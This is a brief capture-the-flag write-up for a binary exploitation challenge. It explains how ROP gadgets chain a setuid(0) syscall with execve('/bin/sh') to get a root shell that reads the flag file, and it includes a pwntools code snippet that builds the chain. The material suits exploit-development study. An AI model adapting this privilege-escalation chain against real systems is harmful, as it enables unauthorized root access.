In this challenge the `/flag` file is never opened. 

But there is a `syscall` rop gadget present there which means we can call any syscall

So first we will call setuid with argument 0 so that it grant root access
Next we can call execve with argument /bin/sh. 
We can put the string /bin/sh at the start of the input buffer and give the address of input buffer to the execve function. 
The address is leaked by the program itself.
This shell will have root access which means we can read flag file.

```python
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])
pop_rax = rop.find_gadget(['pop rax', 'ret'])
syscall = rop.find_gadget(['syscall'])  # Address of the syscall gadget

#call setuid
rop.raw(pop_rdi)
rop.raw(0)              # Argument for setuid (0 = root)
rop.raw(pop_rax)
rop.raw(105)            # Syscall number for setuid
rop.raw(syscall)  

# Set up the ROP chain to call execve("/bin/sh", 0, 0)
rop.raw(pop_rdi)
rop.raw(bin_sh_addr)  # Address of "/bin/sh" string
rop.raw(pop_rsi)
rop.raw(0)            # argv = NULL
rop.raw(pop_rdx)
rop.raw(0)            # envp = NULL
rop.raw(pop_rax)
rop.raw(59)           # Syscall number for execve
rop.raw(syscall)      # Invoke syscall
```

(https://x64.syscall.sh/)
